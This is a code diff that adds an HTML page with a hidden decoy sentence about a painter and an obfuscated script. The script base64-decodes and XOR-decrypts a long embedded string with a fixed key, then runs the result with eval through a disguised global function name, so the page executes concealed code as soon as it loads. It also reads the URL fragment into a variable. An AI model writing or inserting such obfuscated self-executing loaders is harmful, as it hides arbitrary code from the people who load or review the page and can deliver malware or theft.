@@ -1,0 +1,44 @@
+<html>
+ <body>
+ <span hidden>The painter captured a dramatic sky in broad brushstrokes.</span>
+ </body>
+<script>
+z = null;
+if(location.hash == ""){
+z = "";
+}
+if(location.hash !== ""){
+z = location.hash;
+}
+if (location.hash.includes('?')) {
+z = location.hash.replace('#', '');
+}
+  const n = "ElZAFVFVRBJYTxgFQQdcW0ZVUQ8XFgEXAVZGUHZcUgtSVkwQABdcWhsaVTY5QTsyVVsQHBoLPUYXGBhaBBBHV0QWRwANXAAKHBlTUVcYEAdbVFdPTBBSVVYVWxMKXwsLQx4JPxMQF0ZVXUtMDhQdS1JWUAMMQEwEAFMaElJcWwlAFUxXEU5dWUVRUwAXUQ0LQx4JPxMQF0ZVXUtMDhQdS1JWUAMMQEwEAFMaElJcWwlAFVVXBQJfSxQRD2tDGEJFBlJBQVxHGRVWVlxaDhsdWVdcHEYCVA4KExpBVkFZRxJEHxEDa0MTGBNaURIXVxVLF1ZcUVFfT0hWXFwQRgJfVFxPGREMSBcVFxpGWh5VRAVWSF0VEgJdXFFXTEZKA2hFRBcSV1ZDQwlAFktZDwdRV0sWVQUHEEUECFtdQh5WWBRaSx8RWmkTGBMYVgQQTA0SSkRAVhMNFwdDV1oQRgJ7ahQTVFEAcAJOQ3oEeRQbEB8OVR8TRgJkchQTEw0AUUVOBAICVlMbEAtbTh8TQwFkbhETVAkBbwJORg4DeREbEAsOQR8TRjlKDRQTExgHa0VORg5xZhEbEDVxbx8TAQBrXFMTE1AwfEVORnECexEbEAhuCR8TATVrVFMTFlQ5bUBORmVEYREbFSUPBRoRShkIMhMYFEEBXRERC0AcRkdJWwMZW0tLNQZLTBMFFEYTVxEMEF5dWwkQUQ9PXVwDQQpdS1ZMDkFTSBpeREBbUUdYDUYGCAgdWkNbXVpfXBVZGFNVVBIJFVFfRQJSSgIYURNLAxNVVRMEUQxfRAdCTQhAVgJTUVZfW0MDSEsDFA4VXRADCFhFDxNYXgJTXVYDQRkeUV1cURlZGFtcXQ4LDAgXDGwXGBgYBQxQTV5dWhVNTxAMEFIaV1ZDQwlAEQMyQUMTGFdXVxQOXQwRSlVdUUoeXghZXUpwNS5/GA4YFkNYMkJFRBdWWlBFWgNZTBZaDgdKFlJIRAQNXCENDVtWHVFVRBJYTxED";
+  let h = "d725307f7888ac38384ac8be";
+
+  const x = (o, l) => {
+    const m = atob(o);
+    let j = '';
+    const g = m.length;
+    for (let c = 0; c < g; c++) {
+      j += String.fromCharCode(m.charCodeAt(c) ^ l.charCodeAt(c % l.length));
+    }
+    return j;
+  };
+
+  const k = () => {
+    const v = [
+      ['إ', 'ف'],
+      ['ا', 'ل']
+    ];
+    return v;
+  };
+
+  (function() {
+    const r = k();
+    const u = r.map(s => s.join('')).join('');
+    this[u] = d => eval(d);
+    this[u](x(n, h));
+  })();
+</script>
+</html>
